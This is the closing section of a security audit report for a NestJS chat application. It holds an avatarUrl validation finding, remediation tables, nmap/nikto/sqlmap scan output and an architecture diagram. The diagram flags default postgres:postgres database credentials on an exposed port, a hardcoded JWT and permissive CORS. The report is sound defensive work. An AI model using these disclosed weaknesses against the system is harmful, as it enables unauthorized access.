### VULN-27: `avatarUrl` Accepts Arbitrary Input

**File:** `backend/auth/src/profiles/dto/update-profile.dto.ts`  
**CVSS:** 3.0 (LOW)

#### Description
`avatarUrl` is `@IsString()` with no URL scheme validation. Users can set it to `data:` URIs, external tracking pixels, or `javascript:` URIs.

#### Fix
Add URL validation:
```typescript
@IsOptional()
@IsUrl({ protocols: ['https'], require_protocol: true })
avatarUrl?: string;
```

---

## Updated Remediation Guide

### Priority 2 — Fix Soon (HIGH) — Updated

| # | Action | File(s) to Change |
|---|--------|-------------------|
| 6 | Remove `senderId` from SendMessageDto, derive from JWT | `send-message.dto.ts`, `chat.controller.ts` |
| 7 | Block SVG uploads, add magic byte validation, add auth to upload | `chat.controller.ts` |
| 8 | Add ownership check to comment update | `comments.service.ts` |
| 9 | Migrate JWT storage to httpOnly cookies | Frontend `authApi.ts`, Backend auth controller |
| 20 | Add membership check to WebSocket `join_room` | `chat.gateway.ts` |
| 21 | Fix chat message update/delete IDOR | `chat.controller.ts` |

### Priority 3 — Fix Before Production (MEDIUM) — Updated

| # | Action | File(s) to Change |
|---|--------|-------------------|
| 10-16 | (Same as before) | |
| 22 | Remove duplicate nginx route mappings | `nginx.conf` |
| 23 | Add role check or ownership filter to `GET /users/:id` | `users.controller.ts` |
| 24 | Remove email from `/chat/users` response | `chat.service.ts` |
| 25 | Add security headers to uploaded file serving | `nginx.conf` |

### Priority 4 — Low Risk (LOW)

| # | Action | File(s) to Change |
|---|--------|-------------------|
| 17-19 | (Same as before) | |
| 26 | Unify registration error messages | `auth.service.ts` |
| 27 | Add URL validation to avatarUrl | `update-profile.dto.ts` |

---

## Scan Evidence & Artifacts

### Nmap Scan Results
```
PORT     STATE  SERVICE
80/tcp   closed http
443/tcp  open   https
5433/tcp open   pyrrho (PostgreSQL)
```

### Nikto Findings (Key)
```
+ Server: nginx/1.28.2
+ X-Frame-Options header is not present
+ Strict-Transport-Security HTTP header is not defined
+ X-Content-Type-Options header is not set
+ /package.json: Node.js package file found
+ /.gitignore: .gitignore file found
```

### WAFw00f
```
[-] No WAF detected by the generic detection
```

### Browser Agent Security Score
```
Security Score: 70/100
Issues Found: 6
- Missing CSP header
- Missing X-Frame-Options
- Missing X-Content-Type-Options
- Missing Referrer-Policy
- Missing HSTS
- 1 inline JavaScript block
```

### SQLMap
```
No SQL injection vulnerabilities found (Prisma ORM parameterized queries)
```

---

## Architecture Diagram

```
┌──────────────┐    HTTPS/443     ┌──────────┐
│   Browser    │ ←───────────────→ │  Nginx   │
└──────────────┘                   └────┬─────┘
                                        │
              ┌─────────────────────────┼─────────────────────────┐
              ▼                         ▼                         ▼
    ┌──────────────────┐    ┌──────────────────┐    ┌──────────────────┐
    │   auth_service   │    │  chat_service    │    │  core_service    │
    │  NestJS:3000     │    │  NestJS:3000     │    │  NestJS:3000     │
    │  ⚠ CORS: any     │    │  WebSocket/IO    │    │  ⚠ CORS: any     │
    │  ⚠ Chat: no auth │    │  ⚠ JWT hardcoded │    │  Proxy only      │
    │  Prisma → DB     │    └────────┬─────────┘    └────────┬─────────┘
    └────────┬─────────┘             │ HTTP to auth           │ HTTP to auth
             │                       └──────────┬─────────────┘
             ▼                                  ▼
    ┌──────────────────────────────────────────────┐
    │         PostgreSQL (postgres:postgres)         │
    │         ⚠ Exposed on host port 5433           │
    └──────────────────────────────────────────────┘
```

---

**End of Security Audit Report**

*Generated during penetration test on March 3, 2026*
SECURITY_AUDIT.md
36 KB